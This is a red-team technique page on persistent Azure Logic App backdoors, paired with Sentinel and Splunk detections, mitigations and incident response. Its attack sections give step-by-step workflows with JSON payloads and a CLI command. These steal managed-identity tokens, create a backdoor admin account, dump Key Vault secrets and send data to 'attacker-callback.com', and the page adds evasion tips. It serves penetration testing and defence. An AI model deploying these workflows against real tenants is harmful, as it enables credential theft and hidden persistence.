# [PERSIST-SCHED-002]: Logic App Backdoors

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-SCHED-002 |
| **MITRE ATT&CK v18.1** | [T1053 - Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/) |
| **Azure Threat Research Matrix** | [AZT503.1 - Logic Application HTTP Trigger](https://microsoft.github.io/Azure-Threat-Research-Matrix/Persistence/Persistence/) |
| **Tactic** | Persistence |
| **Platforms** | Entra ID, Azure Logic Apps, Azure Integration Services |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Azure Logic Apps versions (Consumption Plan and Standard Plan) |
| **Patched In** | N/A (No patch; requires RBAC and API connection hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Logic Apps are serverless workflow automation engines that execute on-demand, on schedules, or in response to events (HTTP triggers, blob uploads, email arrivals, etc.). An attacker with **Contributor** or **Logic App Contributor** role on a Logic App, or **Contributor** on an API Connection can create persistent backdoors by:

1. **HTTP-Triggered Workflows:** Create unauthenticated or weakly-authenticated HTTP endpoints that execute malicious actions (exfiltrate tokens, modify resources, trigger lateral movement)
2. **Scheduled Workflows:** Configure recurrence triggers to execute automated exfiltration, beaconing, or privilege escalation payloads at regular intervals
3. **Hijacked API Connections:** Reuse existing authenticated API Connections (Exchange, Graph, Key Vault, SQL) to perform actions the original connection owner never intended

Unlike traditional webhooks, Logic Apps integrate with 600+ cloud services and on-premises systems. An attacker can, for example, hijack an HR system API connection to modify user roles, or abuse a Key Vault connection to steal secrets. The workflow definitions are stored in Azure, making them invisible to on-premises monitoring. Execution logs can be retrieved and deleted by the attacker if they have sufficient permissions.

**Attack Surface:** Logic App designers, HTTP triggers, API Connections (OAuth secrets and managed identities), scheduled recurrence triggers, webhook callbacks, and event-based triggers (Blob Storage, Event Grid, Service Bus).

**Business Impact:** **Critical - Cross-System Lateral Movement.** A single compromised Logic App with access to an API Connection can pivot to any system that connection authenticates to (Exchange Online, Azure SQL, Key Vault, SharePoint, etc.). The attack is highly stealthy because:
- Workflows appear as legitimate automation
- Execution occurs in cloud-native sandboxes (no on-premises logs)
- Actions execute with the API Connection's identity, masking the attacker
- Audit trails can be suppressed if the attacker has sufficient permissions

**Technical Context:** Logic App creation requires seconds. Execution begins immediately if HTTP-triggered, or on the next scheduled interval. Detection requires enabled Activity Log diagnostics and careful monitoring of `Microsoft.Logic/workflows/write` operations. Many organizations do not monitor Logic App execution logs or API Connection usage.

### Operational Risk

- **Execution Risk:** Medium - Requires Contributor role on Logic App or API Connection resource
- **Stealth:** Very High - Workflows blend in with legitimate business automation
- **Reversibility:** No - Deployed workflows execute persistently; requires deletion for remediation

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure Foundations 3.1.1 | Ensure that Microsoft Sentinel is enabled for critical security operations |
| **DISA STIG** | AZUR-CLD-000600 | All Logic Apps must have diagnostic logging enabled and monitored |
| **NIST 800-53** | AC-3, AC-6, SI-4 | Access Enforcement, Least Privilege, Information System Monitoring |
| **GDPR** | Art. 32 | Security of Processing - Data breach via compromised workflow |
| **DORA** | Art. 9, Art. 15 | Protection and Prevention, Testing and Control of critical automation |
| **NIS2** | Art. 21(1)(b), Art. 21(1)(e) | Cyber Risk Management, Incident Detection and Response |
| **ISO 27001** | A.9.2.3, A.12.6 | Privileged Access Rights, Integrity of Technical Systems |
| **ISO 27005** | Risk Scenario | "Compromise of Cloud Automation Service" with cross-system impact |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Logic App Contributor, Azure Contributor, or custom role with `Microsoft.Logic/workflows/write` and API Connection access
- **Required Access:** Azure Portal, Azure CLI, or REST API with authenticated credentials

**Supported Platforms:**
- **Azure Logic Apps:** Consumption Plan (multi-tenant, shared runtime) and Standard Plan (single-tenant, dedicated runtime)
- **Connectors:** 600+ cloud and on-premises integrations (Exchange, SQL, Key Vault, SharePoint, etc.)
- **API Connections:** Managed identities, OAuth 2.0, connection strings, or API keys

**Tools:**
- [Azure Portal](https://portal.azure.com)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.40+)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/) (Version 8.0+)
- [Azure SDKs](https://learn.microsoft.com/en-us/azure/developer/python/) (Python, .NET, Node.js for REST API calls)
- [NetSPI MicroBurst](https://github.com/NetSPI/MicroBurst) (Optional, for enumeration)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Azure Portal / PowerShell Reconnaissance

**Identify existing Logic Apps and API Connections:**

```powershell
# Connect to Azure
Connect-AzAccount

# List all Logic Apps in subscription
Get-AzLogicApp | Select-Object Name, Location, ResourceGroupName, State

# List all API Connections (OAuth/connector credentials)
Get-AzResource -ResourceType "Microsoft.Web/connections" | Select-Object Name, ResourceGroupName

# Check role assignments on Logic Apps
$logicApp = Get-AzLogicApp -Name "MyLogicApp" -ResourceGroupName "MyRG"
Get-AzRoleAssignment -Scope $logicApp.Id | Select-Object DisplayName, RoleDefinitionName
```

**What to Look For:**
- Logic Apps with Managed Identities assigned at Subscription or Management Group scope (indicates broad permissions)
- API Connections in Resource Groups with few owners (less monitored)
- Recurrence-triggered workflows without purpose (potential hidden persistence)
- HTTP-triggered Logic Apps without IP restrictions

**Check for Sensitive API Connections:**

```powershell
# Get API Connection details (includes authentication type)
$connection = Get-AzResource -ResourceType "Microsoft.Web/connections" -Name "MyConnection"
Get-AzResource -ResourceId $connection.ResourceId -ExpandProperties | Select-Object Properties

# Check which connectors have access to Key Vault, SQL, Exchange, etc.
Get-AzLogicAppTrigger -LogicAppName "MyLogicApp" -ResourceGroupName "MyRG"
```

#### Azure CLI Reconnaissance

```bash
# List all Logic Apps
az logic workflow list --output table

# Get API connections
az resource list --resource-type "Microsoft.Web/connections" --output table

# Check Logic App triggers and actions
az logic workflow show --name "MyLogicApp" --resource-group "MyRG"
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Creating an HTTP-Triggered Logic App Backdoor (Unauthenticated)

**Supported Versions:** All Azure Logic Apps versions

#### Step 1: Create or Identify Target Logic App

**Objective:** Deploy a new Logic App or hijack an existing one

**Manual Steps (Create New):**
1. Navigate to **Azure Portal** → Search for **"Logic App"**
2. Click **+ Create**
3. Configure:
   - **Resource Group:** Select or create (preferably an existing, less-monitored group)
   - **Logic App name:** Use benign name (e.g., `WorkflowAutomation`, `DataProcessing`)
   - **Region:** Select region matching other resources
   - **Plan:** Consumption (cheaper, less monitored) or Standard (more control)
4. Click **Create**

**Manual Steps (Hijack Existing):**
1. Navigate to **Automation Accounts** or **Logic Apps** blade
2. Find a Logic App you have Contributor access to
3. Go to **Logic app designer** (left sidebar)
4. Click **Edit**

#### Step 2: Configure HTTP Trigger

**Objective:** Create an HTTP endpoint that can be invoked remotely without authentication

**Manual Steps:**
1. In the Logic App designer, click **+ New step** → **Trigger**
2. Search for **"HTTP"** trigger
3. Configure:
   - **Method:** POST (to accept data payloads)
   - **URI:** Will be auto-generated (e.g., `https://prod-123.eastus.logic.azure.com:443/triggers/manual/paths/invoke?api-version=2016-06-01&sp=/triggers/manual/run&sv=1.0&sig=...`)
4. **Important:** The trigger URI is unauthenticated by default. Anyone with the URL can invoke it.

**Expected Trigger URL Example:**
```
https://prod-123.eastus.logic.azure.com:443/triggers/manual/paths/invoke?api-version=2016-06-01&sp=/triggers/manual/run&sv=1.0&sig=ABC123XYZ
```

#### Step 3: Add Malicious Workflow Actions

**Objective:** Define the payload that executes when the HTTP trigger fires

**Malicious Action Examples:**

**Example 1: Token Exfiltration (Managed Identity)**

```json
{
  "inputs": {
    "host": {
      "connection": {
        "name": "@parameters('$connections')['managedidentity']['connectionId']"
      }
    },
    "method": "get",
    "path": "/invoke",
    "queries": {
      "api-version": "2017-09-01",
      "resource": "https://graph.microsoft.com"
    }
  },
  "runAfter": {},
  "type": "ApiConnection"
}
```

This action retrieves a token from the Logic App's Managed Identity, which can then be exfiltrated.

**Example 2: Add Global Admin User to Azure AD**

```json
{
  "inputs": {
    "authentication": {
      "type": "ManagedServiceIdentity"
    },
    "body": {
      "accountEnabled": true,
      "displayName": "ServiceAccount",
      "mailNickname": "svc_account",
      "userPrincipalName": "svc_account@contoso.onmicrosoft.com",
      "passwordProfile": {
        "forceChangePasswordNextSignIn": false,
        "password": "Temporary@1234"
      }
    },
    "method": "POST",
    "uri": "https://graph.microsoft.com/v1.0/users"
  },
  "runAfter": {},
  "type": "Http"
}
```

This creates a backdoor admin user.

**Example 3: Exfiltrate Key Vault Secrets**

```json
{
  "inputs": {
    "host": {
      "connection": {
        "name": "@parameters('$connections')['keyvault']['connectionId']"
      }
    },
    "method": "get",
    "path": "/secrets"
  },
  "runAfter": {},
  "type": "ApiConnection"
}
```

This retrieves all secrets from a Key Vault the API Connection has access to.

**Example 4: Beacon to Attacker C2**

```json
{
  "inputs": {
    "body": {
      "tenant": "@parameters('tenantId')",
      "timestamp": "@utcNow()",
      "principal": "@parameters('principalId')"
    },
    "method": "POST",
    "uri": "https://attacker-callback.com/beacon"
  },
  "runAfter": {},
  "type": "Http"
}
```

This sends periodic beacons to an attacker-controlled server.

#### Step 4: Save and Deploy Logic App

**Manual Steps:**
1. Click **Save** (top toolbar)
2. The Logic App is immediately active and the HTTP trigger URL is live
3. Test the trigger by copying the URL and making a POST request:

```bash
curl -X POST "https://prod-123.eastus.logic.azure.com:443/triggers/manual/paths/invoke?..." \
  -H "Content-Type: application/json" \
  -d '{"action":"execute"}'
```

**OpSec & Evasion:**
- Hide the trigger URL in environment variables or log files that only the attacker can access
- Use a descriptive name for the Logic App that blends in (e.g., `WorkflowAutomation`, `DataSyncProcess`)
- Set the HTTP trigger to use a Bearer token if paranoid (but this adds detection risk)
- Detection likelihood: **Very High** if Activity Logging is enabled, **Low** if not

---

### METHOD 2: Scheduled Logic App Backdoor (Recurrence Trigger)

**Supported Versions:** All Azure Logic Apps versions

#### Step 1: Create Scheduled Logic App

**Manual Steps:**
1. Create new Logic App (same as METHOD 1, Step 1)
2. In the designer, click **+ New step** → **Trigger**
3. Search for **"Recurrence"** (built-in trigger, not a connector)
4. Configure:
   - **Interval:** 1
   - **Frequency:** Hour (or Day, Week, depending on stealth requirements)
5. Click **Create**

#### Step 2: Add Malicious Actions

**Objective:** Execute payload on each recurrence

**Example Scheduled Action: Hourly Token Exfiltration**

```json
{
  "actions": {
    "ExfiltrateToken": {
      "inputs": {
        "authentication": {
          "type": "ManagedServiceIdentity"
        },
        "method": "GET",
        "uri": "https://graph.microsoft.com/v1.0/me"
      },
      "runAfter": {},
      "type": "Http"
    },
    "SendToAttacker": {
      "inputs": {
        "body": "@body('ExfiltrateToken')",
        "method": "POST",
        "uri": "https://attacker-callback.com/beacon"
      },
      "runAfter": {
        "ExfiltrateToken": ["Succeeded"]
      },
      "type": "Http"
    }
  },
  "triggers": {
    "Recurrence": {
      "recurrence": {
        "frequency": "Hour",
        "interval": 1
      },
      "type": "Recurrence"
    }
  }
}
```

#### Step 3: Deploy and Verify Execution

**Manual Steps:**
1. Click **Save**
2. Go to **Overview** tab
3. Under **Run History**, verify the Logic App executes on schedule
4. Click on an execution to view the output (malicious tokens/data exfiltrated)

**OpSec & Evasion:**
- Set frequency to once per day or once per week to reduce audit log volume
- Use a descriptive name (e.g., `DailyDataSync`, `SystemHealthMonitor`)
- Detection likelihood: **High** (requires analyzing recurrence triggers across all Logic Apps)

---

### METHOD 3: API Connection Hijacking (Advanced Persistence)

**Supported Versions:** All Azure Logic Apps versions

#### Step 1: Identify Target API Connections

**Objective:** Find an existing API Connection to a sensitive system (Key Vault, Exchange, SQL)

**Manual Steps:**
1. Navigate to **Azure Portal** → Search for **"API Connections"**
2. Click on a connection (e.g., Key Vault, Exchange Online, Azure SQL)
3. Go to **Properties** or **Edit API connection** to view:
   - **Connection type** (OAuth 2.0, API Key, etc.)
   - **Authorized user** (whose credentials are stored)
   - **Permissions** (what the connection can do)

**Via PowerShell:**

```powershell
# Get all API connections
Get-AzResource -ResourceType "Microsoft.Web/connections" | ForEach-Object {
    $conn = Get-AzResource -ResourceId $_.ResourceId -ExpandProperties
    Write-Host "Connection: $($_.Name)"
    Write-Host "Type: $($conn.Properties.api.displayName)"
    Write-Host "Status: $($conn.Properties.statuses -join ', ')"
}
```

#### Step 2: Create Logic App Using the API Connection

**Manual Steps:**
1. Create a new Logic App (same as before)
2. In the designer, click **+ New step** → **Add an action**
3. Search for the connector name (e.g., "Office 365 Outlook", "Azure Key Vault", "Azure SQL")
4. If the connection already exists and is authorized, the Logic App will reuse it without re-authentication
5. Add actions like:
   - **For Exchange:** List all emails, send emails on behalf of users, modify calendar
   - **For Key Vault:** List secrets, retrieve values, create new secrets
   - **For SQL:** Query databases, modify records, extract data

**Example: Hijacking Key Vault Connection to Dump Secrets**

```json
{
  "actions": {
    "ListSecrets": {
      "inputs": {
        "host": {
          "connection": {
            "name": "@parameters('$connections')['keyvault']['connectionId']"
          }
        },
        "method": "get",
        "path": "/secrets"
      },
      "type": "ApiConnection"
    },
    "ExfiltrateLogs": {
      "inputs": {
        "body": "@body('ListSecrets')",
        "method": "POST",
        "uri": "https://attacker-callback.com/secrets"
      },
      "runAfter": {
        "ListSecrets": ["Succeeded"]
      },
      "type": "Http"
    }
  }
}
```

#### Step 3: Deploy Backdoor

**Manual Steps:**
1. Click **Save**
2. If prompted for connection authorization, the connection is already authorized (from the original setup), so no additional approval is needed
3. The Logic App can now perform actions as the connected user/system

**OpSec & Evasion:**
- The actions execute with the API Connection's identity, masking the attacker's identity
- Detection likelihood: **Medium** (API Connection usage is logged, but often not monitored closely)

---

### METHOD 4: Event-Based Logic App (Blob Storage / Event Grid Trigger)

**Supported Versions:** Azure Logic Apps Consumption Plan (Event Grid integration)

#### Step 1: Create Event Grid Triggered Logic App

**Objective:** Automatically execute malicious workflow when a specific event occurs (e.g., blob upload)

**Manual Steps:**
1. Create new Logic App
2. In the designer, search for **"Azure Event Grid"** trigger
3. Configure:
   - **Subscription:** Select target subscription
   - **Resource type:** Storage Accounts
   - **Resource name:** (Select storage account)
   - **Event type:** `Microsoft.Storage.BlobCreated` (or modify to fit scenario)
4. This sets up a webhook subscription

#### Step 2: Add Actions to Process Blob

**Example Workflow: Process Every Uploaded Blob**

```json
{
  "actions": {
    "ParseBlobData": {
      "inputs": {
        "content": "@triggerBody()?['data']",
        "schema": {
          "properties": {
            "url": {
              "type": "string"
            }
          }
        }
      },
      "type": "ParseJson"
    },
    "DownloadBlob": {
      "inputs": {
        "authentication": {
          "type": "ManagedServiceIdentity"
        },
        "method": "GET",
        "uri": "@body('ParseBlobData')?['url']"
      },
      "runAfter": {
        "ParseBlobData": ["Succeeded"]
      },
      "type": "Http"
    }
  }
}
```

This automatically processes every blob uploaded to the storage account, potentially exfiltrating data or executing embedded commands.

---

## 5. TOOLS & COMMANDS REFERENCE

### [Azure CLI Logic App Commands](https://learn.microsoft.com/en-us/cli/azure/logic/)

**Version:** 2.40+

**Key Commands:**

```bash
# Create a Logic App
az logic workflow create \
  --resource-group "MyRG" \
  --name "MyLogicApp" \
  --definition '{
    "triggers": {
      "manual": {
        "type": "Request",
        "kind": "Http"
      }
    },
    "actions": {
      "HTTP": {
        "type": "Http",
        "inputs": {
          "method": "POST",
          "uri": "https://attacker-callback.com/beacon"
        }
      }
    }
  }'

# Enable Logic App
az logic workflow update \
  --resource-group "MyRG" \
  --name "MyLogicApp" \
  --set properties.state=Enabled

# Get Logic App definition
az logic workflow show \
  --resource-group "MyRG" \
  --name "MyLogicApp" \
  --query properties.definition
```

### [Azure PowerShell Logic App Cmdlets](https://learn.microsoft.com/en-us/powershell/module/az.logicapp/)

**Version:** Az.LogicApp 2.0+

```powershell
# Get all Logic Apps
Get-AzLogicApp -ResourceGroupName "MyRG"

# Get Logic App definition
$logicApp = Get-AzLogicApp -Name "MyLogicApp" -ResourceGroupName "MyRG"
$definition = Get-AzLogicAppRunHistory -Name "MyLogicApp" -ResourceGroupName "MyRG"

# Create a run trigger
New-AzLogicAppRun -LogicAppName "MyLogicApp" -ResourceGroupName "MyRG"

# Get API connections in subscription
Get-AzResource -ResourceType "Microsoft.Web/connections"
```

### [Azure SDK for Python](https://github.com/Azure/azure-sdk-for-python)

**Example: Create Logic App via REST API**

```python
import requests
import json

# Authenticate
token = "YOUR_BEARER_TOKEN_HERE"

# Create Logic App definition
logic_app_definition = {
    "properties": {
        "definition": {
            "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
            "actions": {},
            "triggers": {
                "manual": {
                    "type": "Request",
                    "kind": "Http"
                }
            }
        },
        "parameters": {}
    }
}

# Create Logic App via REST API
url = "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroup}/providers/Microsoft.Logic/workflows/{workflowName}?api-version=2019-05-01"

headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

response = requests.put(url, json=logic_app_definition, headers=headers)
print(response.status_code, response.json())
```

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Logic App Creation or Modification

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources
- **Alert Severity:** High
- **Frequency:** Every 10 minutes
- **Applies To:** All Logic App versions

**KQL Query:**

```kusto
AuditLogs
| where OperationName has "Microsoft.Logic/workflows" 
    and (OperationName has "write" or OperationName has "create")
| where Result == "Success"
| extend InitiatedByUser = tostring(InitiatedBy.user.userPrincipalName)
| extend TargetWorkflow = tostring(TargetResources[0].displayName)
| extend TargetResourceId = tostring(TargetResources[0].resourceId)
| project TimeGenerated, InitiatedByUser, OperationName, TargetWorkflow, 
          ActivityDisplayName, TargetResourceId, AADTenantId
| where OperationName contains "workflows/write" or 
        OperationName contains "workflows/triggers/write"
```

**Manual Configuration Steps:**
1. Navigate to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Logic App Created or Modified`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste KQL query
   - Run every: `10 minutes`
   - Lookup data from the last: `2 hours`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

#### Query 2: Detect HTTP-Triggered Workflows

**KQL Query:**

```kusto
AuditLogs
| where OperationName has "Microsoft.Logic/workflows" and OperationName has "write"
| where Result == "Success"
| extend WorkflowDef = parse_json(TargetResources[0].modifiedProperties)
| extend TriggerType = tostring(WorkflowDef.definition.triggers[0])
| where TriggerType has "Http" or TriggerType has "Request"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, 
          TargetResources[0].displayName, TriggerType
```

**What This Detects:**
- Creation of Logic Apps with HTTP/Request triggers (unauthenticated entry points)
- Unusual trigger types that could indicate backdoor workflows

#### Query 3: Detect API Connection Reuse Across Logic Apps

**KQL Query:**

```kusto
AuditLogs
| where OperationName has "Microsoft.Logic/workflows" and OperationName has "write"
| extend Connections = parse_json(TargetResources[0].modifiedProperties).parameters.connections
| where isnotempty(Connections)
| summarize count(), min(TimeGenerated) as FirstUse, max(TimeGenerated) as LastUse,
            distinct_users = dcount(InitiatedBy.user.userPrincipalName)
            by TargetResources[0].displayName, tostring(Connections)
| where count_ > 5  // Alert if same connection reused across 5+ workflows
```

---

## 7. SPLUNK DETECTION RULES

#### Rule 1: Logic App with HTTP Trigger Creation Alert

**Rule Configuration:**
- **Required Index:** azure_activity
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** operationName, status, properties.definition
- **Alert Threshold:** Any successful creation
- **Applies To Versions:** All

**SPL Query:**

```spl
index=azure_activity operationName="Microsoft.Logic/workflows/write" 
  OR operationName="Microsoft.Logic/workflows/triggers/write"
  status=Succeeded
| search properties.definition="*Http*" OR properties.definition="*Request*"
| dedup object
| rename claims.ipaddr as src_ip
| rename caller as user
| stats count, min(_time) as firstTime, max(TimeGenerated) as lastTime,
         values(dest) as dest, values(properties.definition) as trigger_type
  by object, user, src_ip, resourceGroupName
| where count > 0
```

**What This Detects:**
- Creates alerts for any new HTTP-triggered Logic App (potentially unauth entry points)
- Identifies the user, IP, and trigger type

#### Rule 2: Logic App Execution Frequency Anomaly

**SPL Query:**

```spl
index=azure_activity operationName="Microsoft.Logic/workflows/jobs/write"
  status=Succeeded
| stats count as execution_count by workflowName, bin(_time, 1h)
| where execution_count > 100  // Alert if > 100 executions per hour
| rename workflowName as Logic_App
```

---

## 8. WINDOWS EVENT LOG MONITORING (N/A - Cloud-Only)

**Note:** Logic Apps execute entirely in Azure cloud infrastructure. No on-premises Windows Event Log entries are generated unless workflows trigger on-premises systems (Hybrid Runbook Workers, on-prem databases). Refer to Microsoft Sentinel for comprehensive monitoring.

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Restrict Logic App Creation and Modification via RBAC**

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Subscriptions** → **Access Control (IAM)**
2. Click **+ Add** → **Add role assignment**
3. Configure:
   - **Role:** Create custom role (see PowerShell below)
   - **Members:** Only select trusted workflow developers
4. Click **Review + assign**

**Create Custom RBAC Role (PowerShell):**

```powershell
$roleDefinition = @{
    Name = "Logic App Viewer"
    Description = "Can view Logic Apps but cannot create or modify"
    Type = "CustomRole"
    Permissions = @{
        Actions = @(
            "Microsoft.Logic/workflows/read",
            "Microsoft.Logic/workflows/triggers/read",
            "Microsoft.Logic/workflows/runs/read"
        )
        NotActions = @(
            "Microsoft.Logic/workflows/write",
            "Microsoft.Logic/workflows/delete",
            "Microsoft.Logic/workflows/triggers/write"
        )
    }
    AssignableScopes = @(
        "/subscriptions/{subscriptionId}"
    )
}

New-AzRoleDefinition -Role $roleDefinition
```

---

**2. Enable Comprehensive Audit Logging for All Logic App Operations**

**Manual Steps:**
1. Navigate to **Azure Portal** → **Subscriptions** → **Activity log** → **Diagnostic settings**
2. Click **+ Add diagnostic setting**
3. Configure:
   - **Diagnostic setting name:** `LogicAppAudit`
   - **Categories:** All (select all available log types)
   - **Destination:** Send to **Log Analytics workspace**
4. Click **Save**

**Verify Audit Logging:**

```powershell
# Check if audit logging is enabled
Get-AzDiagnosticSetting -ResourceId "/subscriptions/{subscriptionId}"
```

---

**3. Disable HTTP Triggers without Authentication**

**Manual Steps (For Each Logic App):**
1. Navigate to **Logic App** → **Logic app designer**
2. Click on the **HTTP trigger**
3. Click **Settings** (gear icon)
4. Configure:
   - **Access Control:** Select **Shared Access Key** or **Azure AD OAuth**
   - **Access Level:** Restrict to **Only users with specific access**
5. Click **Done** → **Save**

**Alternative: Use Azure Functions with API Keys**

If needing HTTP entry points, use Azure Functions with API Keys instead of unauthenticated Logic App triggers:

```powershell
# Create Function App with HTTP trigger (requires function key authentication)
$functionApp = New-AzFunctionApp -ResourceGroupName "MyRG" `
  -FunctionAppName "MyFunction" `
  -Runtime "PowerShell"
```

---

**4. Block or Monitor API Connection Creation**

**Manual Steps:**
1. Navigate to **Azure Portal** → **Policy** (Search)
2. Click **+ Create** → **Policy definition**
3. Create policy to deny creation of API Connections to sensitive services (Key Vault, Exchange, SQL)

**Example Policy (JSON):**

```json
{
  "policyRule": {
    "if": {
      "allOf": [
        {
          "field": "type",
          "equals": "Microsoft.Web/connections"
        },
        {
          "field": "Microsoft.Web/connections/api.id",
          "contains": "/keyvault"
        }
      ]
    },
    "then": {
      "effect": "Deny"
    }
  }
}
```

---

### Priority 2: HIGH

**5. Implement Conditional Access Policies**

**Manual Steps:**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Configure:
   - **Name:** `Restrict Logic App Access from Suspicious IP Ranges`
   - **Users:** All users creating/modifying Logic Apps
   - **Cloud apps:** Azure Logic Apps (Microsoft.Logic/workflows)
   - **Locations:** Exclude trusted locations
   - **Access controls:** Require MFA or Compliant Device
4. Enable policy: **On**

---

**6. Monitor and Alert on Suspicious Logic App Activity**

Use the Sentinel KQL queries above to create automated alerts.

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Azure Audit Log Indicators:**
- Operation: `Microsoft.Logic/workflows/write` (Creation/modification)
- Operation: `Microsoft.Logic/workflows/triggers/write` (Trigger modification)
- Operation: `Microsoft.Logic/connections/write` (API Connection usage)
- Trigger Type: `Http`, `Request` (Unauthenticated entry points)
- Action Type: `ApiConnection` (Using sensitive connectors: Key Vault, Exchange, SQL)
- Frequency: Recurring hourly/daily (potential scheduled exfiltration)

**Workflow Code Indicators:**
- Connections to external URLs (attacker C2 servers)
- Managed Identity token exfiltration (Get-AzAccessToken patterns)
- Microsoft Graph API calls to modify users/roles
- Key Vault secret enumeration (list all secrets)
- Event Grid or Service Bus triggers (event-driven persistence)

---

### Forensic Artifacts

**Cloud Audit Logs:**
- **Location:** Azure Activity Log, Microsoft Sentinel `AuditLogs` table
- **Key Fields:**
  - `TimeGenerated` - When workflow was created
  - `InitiatedBy.user.userPrincipalName` - Who created it
  - `TargetResources[0].displayName` - Logic App name
  - `TargetResources[0].modifiedProperties` - Workflow definition changes

**Runtime Artifacts:**
- **Execution History:** Logic App → **Run history** tab (timestamps, status, inputs/outputs)
- **Managed Identity Tokens:** Tracked in Azure AD Sign-In Logs (if logging enabled)
- **API Connection Audit:** Usage logs for each connector (Exchange, Key Vault, SQL)

---

### Response Procedures

**1. Immediate Isolation:**

```powershell
# Disable the malicious Logic App
Set-AzLogicAppState -ResourceGroupName "MyRG" `
  -Name "SuspiciousLogicApp" `
  -State Disabled

# Delete the Logic App if necessary
Remove-AzLogicApp -ResourceGroupName "MyRG" `
  -Name "SuspiciousLogicApp" -Force
```

**2. Collect Evidence:**

```powershell
# Export the Logic App definition
$logicApp = Get-AzLogicApp -Name "SuspiciousLogicApp" -ResourceGroupName "MyRG"
$definition = Get-Content -Path ($logicApp.DefinitionPath)
$definition | Out-File -FilePath "C:\Evidence\logic_app_definition.json"

# Export run history
Get-AzLogicAppRunHistory -Name "SuspiciousLogicApp" -ResourceGroupName "MyRG" | 
  Export-Csv -Path "C:\Evidence\run_history.csv"
```

**3. Investigate API Connection Abuse:**

```powershell
# Check which secrets/data were accessed via compromised API Connection
# (Requires audit logs from the connected service: Key Vault, Exchange, SQL)

# For Key Vault: Check audit logs for secret retrievals
Get-AzKeyVaultAccessLog -VaultName "MyVault" | Where-Object { $_.Caller -like "*LogicApp*" }

# For Exchange: Check mailbox audit logs
Search-MailboxAuditLog -Identity "*" -LogonTypes Delegate `
  -ResultSize Unlimited | Export-Csv "C:\Evidence\exchange_audit.csv"
```

**4. Revoke Compromised API Connections:**

```powershell
# Get the API Connection
$connection = Get-AzResource -ResourceType "Microsoft.Web/connections" `
  -Name "MyConnection" -ResourceGroupName "MyRG"

# Disconnect/delete the connection
Remove-AzResource -ResourceId $connection.ResourceId -Force
```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002](https://github.com/SERVTEP/MCADDF/wiki/) | OAuth consent grant attack to compromise user account |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-001](https://github.com/SERVTEP/MCADDF/wiki/) | Escalate to Logic App Contributor or API Connection access |
| **3** | **Current Step** | **[PERSIST-SCHED-002]** | **Create persistent Logic App backdoor** |
| **4** | **Lateral Movement** | [LM-AUTH-029](https://github.com/SERVTEP/MCADDF/wiki/) | Use hijacked API Connections to access Key Vault, Exchange, SQL |
| **5** | **Collection** | [COL-M365-001](https://github.com/SERVTEP/MCADDF/wiki/) | Exfiltrate data via compromised workflow |

---

## 12. REAL-WORLD EXAMPLES

#### Example 1: NetSPI Azure Logic App Abuse Research (April 2024)

- **Target:** Multiple Azure tenants in penetration testing
- **Technique Usage:** Created malicious Logic Apps using hijacked API Connections to Key Vault and Exchange. Dumped secrets and modified user permissions.
- **Impact:** Attackers gained access to production credentials and could impersonate executives
- **Reference:** [NetSPI - Illogical Apps - Exploring and Exploiting Azure Logic Apps](https://www.netspi.com/blog/technical-blog/cloud-pentesting/illogical-apps-exploring-exploiting-azure-logic-apps/)

#### Example 2: NetSPI Logic App Contributor to Root Owner Privilege Escalation (March 2022)

- **Target:** Azure tenant during penetration test
- **Technique Usage:** Used Logic App Contributor access on API Connection to ARM (Azure Resource Manager). Exploited path traversal to escape from Resource Group scope and assign roles at Root level.
- **Impact:** Gained Owner access to entire Azure tenant
- **Disclosure:** Reported to Microsoft Security Response Center (MSRC)
- **Reference:** [NetSPI - Escalating from Logic App Contributor to Root Owner](https://www.netspi.com/blog/technical-blog/cloud-pentesting/azure-logic-app-contributor-escalation-to-root-owner/)

#### Example 3: Azure Blob Storage Event-Triggered Logic App Attack (October 2025)

- **Target:** Organization with Azure Blob Storage + Event Grid integration
- **Technique Usage:** Attacker gained access to blob storage, then triggered Event Grid-based Logic Apps to execute malicious code processing uploaded files. Used this to move laterally to downstream systems.
- **Impact:** Lateral movement to SQL databases and file shares
- **Reference:** [Microsoft Security Blog - Azure Blob Storage Threat Activity](https://www.microsoft.com/en-us/security/blog/2025/10/20/inside-the-attack-chain-threat-activity-targeting-azure-blob-storage/)

---